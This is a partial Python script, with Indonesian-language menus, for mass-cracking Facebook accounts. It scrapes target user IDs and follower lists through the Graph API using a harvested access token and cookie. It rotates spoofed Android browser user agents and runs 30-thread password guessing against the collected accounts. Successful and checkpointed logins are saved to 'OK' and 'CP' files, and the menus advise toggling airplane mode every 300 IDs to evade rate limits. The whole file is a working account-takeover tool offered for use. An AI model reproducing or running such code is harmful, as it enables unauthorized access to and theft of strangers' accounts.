...
for t in range(10000):
	...
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	brayen1=f'Mozilla/5.0 (Linux; Android {a}; 2201117TG Build/SKQ1.{b}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen2=f'Mozilla/5.0 (Linux; Android {a}; SM-A205S Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen3=f'Mozilla/5.0 (Linux; Android {a}; CPH2213 Build/RP1A.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen4=f'Mozilla/5.0 (Linux; Android {a}; V1930 Build/SP1A.{b}.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen5=f'Mozilla/5.0 (Linux; Android {a}; RMX3350 Build/TP1A.{b}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
...
def menu(id):
	...
	cetak(nel('\t❤️Selamat Datang Ayang❤️ '))
	print(f'❤️ID Elu❤️ : {id}')
	print(f'❤️IP Elu❤️ : {ip}')
	print('')
	print('❤️1. Crack Publik ')
	print('❤️2. Crack Follower ')
	...
	if _____alvino__adijaya_____ in ['1']:
		...
		print('❤️Sukses Logout+Hapus Kukis❤️ ')
		exit()
	else:
		print('❤️Pilih Yang Bener Bro❤️ ')
		back()
def error():
	print(f'{k}❤️Rusak Gak Usah Dipaksa❤️ {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	...
	if kz in ['1','01']:
		...
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			print('❤️Anda Tidak Mempunyai File CP❤️ ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def nge_krek1():
		...
		try:
			...
			print('❤️Total Idz❤️ : {}'.format(len(id)));setting()
		except Exception as e:
			print(e)
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		...
		exit()
	print('❤️Ketik ( me ) Jika Ingin Crack Follower Sendiri❤️ ')
	pil = input('❤️Masukkan Idz Target❤️ : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'❤️Total Idz :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('❤️Koneksi Internet Bermasalah❤️ ')
		exit()
	except (KeyError,IOError):
		print('❤️Gagal Mengambil Target❤️ ')
		exit()
#------------------[ CRACK-GRUP ]-----------------#
balmond = b+"["+h+"✓"+b+"]"
...
def setting():
	print('❤️1.Akun Tua❤️ ')
	print('❤️2.Akun Baru❤️ ')
	print('❤️ 3.Akun Acak❤️ ')
	print('')
	hu = input('❤️Pilih❤️ : ')
	if hu in ['1','01']:
...
#	else:
#		taplikasi.append('no')
	pwplus=input('❤️Tambahkan Password Manual❤️ ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('❤️Masukkan Password Tambahan❤️ : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'❤️❤️❤️{m}•{k}•{h}•{x} Mencari Ayang Chuakzz {m}•{k}•{h}•{x}❤️❤️❤️')
	print('')
	print(f'💚Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'💛Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print(f'❤️Mainkan Mode Pesawat Setiap {m}300{x} Idz\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]❤️[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ❤️[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('❤️Lanjut Crack Kembali❤️ ( Y/t ) ? ')
	woi = input('❤️Pilih❤️ : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}❤️{k} Good Bye Dadaahh{x} ❤️ ')
		time.sleep(2)
		exit()
#--------------------[ METODE-ALPHA ]-----------------#
def crack(idf,pwv):
